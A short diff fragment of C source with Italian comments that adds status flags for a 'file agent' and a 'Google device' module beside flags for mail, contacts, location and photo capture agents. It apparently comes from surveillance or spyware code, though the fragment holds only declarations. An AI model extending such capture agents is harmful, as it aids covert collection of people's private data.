@@ -71,6 +71,8 @@ BOOL bPM_MailCapStarted;		// Indica se l'agente e' attivo o meno
 BOOL bPM_ContactsStarted;
 BOOL bPM_LocationStarted;
 BOOL bPM_PhotosStarted;
+BOOL bPM_FileAgentStarted;
+BOOL bPM_GoogleDeviceStarted;
 
 DWORD max_social_mail_len;		// Dimensione oltre la quale sega un messaggio di gmail
 
